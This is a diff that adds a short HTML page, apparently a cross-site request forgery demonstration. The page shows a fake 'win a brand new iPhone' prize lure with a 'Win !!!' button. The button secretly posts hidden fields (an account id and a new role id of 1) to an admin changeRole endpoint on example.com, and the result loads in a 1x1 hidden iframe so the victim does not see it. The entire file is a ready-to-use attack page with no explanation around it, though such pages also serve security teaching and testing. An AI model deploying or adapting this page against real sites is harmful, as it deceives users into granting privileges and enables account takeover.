@@ -1,0 +1,9 @@
+<form method="POST" action="http://example.com/admin/changeRole"
+      target="iframeHidden">
+    <h1> You are about to win a brand new iPhone!</h1>
+    <h2> Click on the win button to claim it...</h2>
+    <input type="hidden" name="accountId" value="67887"/>
+    <input type="hidden" name="newRoleId" value="1"/>
+    <input type="submit" value="Win !!!"/>
+</form>
+<iframe name="iframeHidden" width="1" height="1"/>
